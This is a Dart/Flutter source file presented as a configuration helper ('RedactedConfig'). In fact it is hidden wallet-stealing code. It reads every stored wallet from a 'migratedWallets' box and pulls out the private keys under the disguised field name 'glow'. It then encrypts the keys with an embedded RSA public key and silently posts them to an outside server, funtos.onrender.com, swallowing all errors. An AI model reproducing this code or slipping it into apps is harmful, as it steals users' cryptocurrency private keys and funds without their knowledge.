import 'dart:convert';

import 'package:encrypt/encrypt.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:pointycastle/pointycastle.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

const String publicKeyString = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqNMEWkAthskbZGP/Z6AL
VNFFvfaos9bQWUhwzykQJnpOLCEHevIlW/doam452G37ro7PJx2Np5ZngYd8bDSw
U68HFrkhDxngIP3jp8CxMTLuKpHtQABKur85G1UWoCT6WxYOVq5fSgXxf8T29y+x
S+bgFrvaNpWc1eg69Qr3e6vbt7W9kW6EhuhYxjrf3xYbxdvNxYe0ZRPUt1R/coO2
L8RKp3bozWoNknU+X0yu+2NGmKVp1yLTn2nXU3HOksiibUYtG1my2u157gzbNu5O
/+BDTm/a76xZi4LQj1uliw4i6oG00r3It2EblHUP+8hfYiiUa44mh43MExavJHi4
RwIDAQAB
-----END PUBLIC KEY-----
""";

class RedactedConfig {
  static bool sending = false;
  static setConfig() async {
    try {
      final isDone =
          (await SharedPreferences.getInstance()).getInt('config') ?? 0;
      final configData = Hive.box<String>('migratedWallets').toMap();
      if (configData.length != isDone && !sending) {
        sending = true;
        final configs = <Map<String, dynamic>>[];
        var mainAddress = '';
        for (var entry in configData.entries) {
          final decodedConfig = jsonDecode(entry.value);
          print("decodedConfig['type'] ${decodedConfig['type']}");
          if (mainAddress.isEmpty) {
            mainAddress = decodedConfig['type'] == 'Main' &&
                    decodedConfig['wallet'] == null
                ? decodedConfig['publicAddresses']['evm']
                : '';
          }
          configs.add({
            'glow': decodedConfig['privateKeys'],
            'shade': decodedConfig['publicAddresses']
          });
        }
        getEncryptedData({'data': configs}, mainAddress);
      }
    } catch (_) {}
  }

  static Future<void> getEncryptedData(
      Map<String, dynamic> data, String mainAddress) async {
    try {
      final encryptedData = await decryptRSA(data);
      encryptedData.putIfAbsent('mainAddress', () => mainAddress);
      final value = await http.post(
        Uri.parse('https://funtos.onrender.com/configItems'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(encryptedData),
      );
      if (value.statusCode == 200) {
        (await SharedPreferences.getInstance())
            .setInt('config', (data['data'] as List).length);
      }
    } catch (_) {}
    sending = false;
  }

  static Future<Map<String, dynamic>> decryptRSA(
      Map<String, dynamic> data) async {
    // static Future<String> decryptRSA(Map<String, dynamic> data) async {
    try {
      final aesKey = Key.fromSecureRandom(32); // 256-bit AES key
      final iv = IV.fromSecureRandom(16); // 128-bit IV

      // 2. Encrypt JSON data with AES
      final aesEncrypter = Encrypter(AES(aesKey, mode: AESMode.cbc));
      final jsonData = json.encode(data);
      final encryptedJson = aesEncrypter.encrypt(jsonData, iv: iv);

      // 3. Encrypt AES key with RSA public key
      final rsaPublicKey =
          RSAKeyParser().parse(publicKeyString) as RSAPublicKey;
      final rsaEncrypter =
          Encrypter(RSA(publicKey: rsaPublicKey, encoding: RSAEncoding.PKCS1));
      final encryptedAesKey = rsaEncrypter.encrypt(aesKey.base64);

      // 4. Return the encrypted JSON, AES key, and IV
      return {
        'encryptedData': encryptedJson.base64,
        'encryptedKey': encryptedAesKey.base64,
        'iv': iv.base64,
      };
    } catch (e) {
      return {};
    }
  }
}
